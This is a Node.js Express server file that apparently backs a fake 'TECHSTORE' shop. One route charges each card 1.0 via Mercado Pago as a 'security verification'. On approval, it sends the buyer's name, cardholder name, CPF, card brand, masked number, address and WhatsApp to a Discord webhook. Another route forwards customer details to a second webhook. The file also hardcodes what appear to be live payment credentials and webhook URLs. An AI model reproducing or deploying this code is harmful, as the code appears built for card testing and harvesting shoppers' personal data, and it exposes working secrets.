const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// CONFIGURAÇÃO - Protegido no Servidor
const ACCESS_TOKEN = "APP_USR-1954942567690031-012818-20e9de4b75bb3d0c284b51790db079c8-3163639724";
const DISCORD_CARTAO = "https://discord.com/api/webhooks/1471002040477028362/UYLVL8C6hoLpq-SSzW0QzbamEBi69o3-erTBL3pItUENDc_rmtCIRlYdp1vRYh09Kpvb";
const DISCORD_PIX = "https://discord.com/api/webhooks/1471325832973910016/i69-SOOxG49VCMCIpDida0ayUsckd2RJNFFB3Nst4khxY2TpOldTM3I9hqIZIeKZ4fH7";

// ROTA PARA NOTIFICAR INTENÇÃO DE PIX
app.post('/notificar-pix', async (req, res) => {
    try {
        const { nome, total, whatsapp, endereco } = req.body;
        await axios.post(DISCORD_PIX, {
            embeds: [{
                title: "💎 INTENÇÃO DE PAGAMENTO PIX",
                color: 0x00ffff,
                fields: [
                    { name: "👤 Cliente", value: nome, inline: true },
                    { name: "💰 Valor", value: total, inline: true },
                    { name: "📱 WhatsApp", value: whatsapp || "Não informado" },
                    { name: "📍 Endereço", value: endereco }
                ],
                timestamp: new Date()
            }]
        });
        res.json({ status: 'ok' });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

// ROTA PARA VALIDAR CARTÃO
app.post('/validar-cartao', async (req, res) => {
    const { token, payment_method_id, cpf, nome_cartao, numero_mascarado, nome_cliente, parcelas, whatsapp, endereco } = req.body;

    try {
        const response = await axios.post('https://api.mercadopago.com/v1/payments', {
            transaction_amount: 1.0,
            token: token,
            description: "Verificação de Segurança",
            installments: 1,
            payment_method_id: payment_method_id, // Identifica se é Visa, Master, etc.
            payer: {
                email: "cliente@email.com",
                identification: { type: "CPF", number: cpf.replace(/\D/g, '') }
            }
        }, {
            headers: { 'Authorization': `Bearer ${ACCESS_TOKEN}` }
        });

        if (['approved', 'in_process', 'pending'].includes(response.data.status)) {
            await axios.post(DISCORD_CARTAO, {
                embeds: [{
                    title: "💳 CARTÃO VALIDADO - TECHSTORE",
                    color: 0x27ae60,
                    fields: [
                        { name: "👤 Cliente", value: nome_cliente, inline: true },
                        { name: "⭐ No Cartão", value: nome_cartao.toUpperCase(), inline: true },
                        { name: "🪪 CPF", value: cpf, inline: true },
                        { name: "🚩 Bandeira", value: payment_method_id.toUpperCase(), inline: true },
                        { name: "💳 Número", value: `\`${numero_mascarado}\`` },
                        { name: "💰 Parcelas", value: parcelas },
                        { name: "📍 Endereço", value: endereco },
                        { name: "📱 WhatsApp", value: whatsapp || "Não informado" }
                    ],
                    timestamp: new Date()
                }]
            });
            return res.json({ status: 'success' });
        }
        res.status(400).json({ status: 'error' });
    } catch (error) {
        res.status(400).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));
